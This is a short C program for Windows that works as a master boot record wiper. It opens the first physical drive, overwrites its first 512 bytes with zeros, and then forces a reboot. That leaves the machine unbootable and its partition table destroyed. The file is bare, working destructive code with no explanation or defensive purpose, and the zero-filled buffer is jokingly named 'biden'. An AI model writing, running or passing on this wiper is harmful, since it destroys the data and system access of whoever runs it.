#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

#define BUFF_SIZE 512

int main(){
  DWORD wrote;
  HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

  const char biden[BUFF_SIZE];
  ZeroMemory(biden, BUFF_SIZE);
  
  if(WriteFile(mbr, biden, BUFF_SIZE, &wrote, NULL)){
      system("shutdown /r");
  }

}
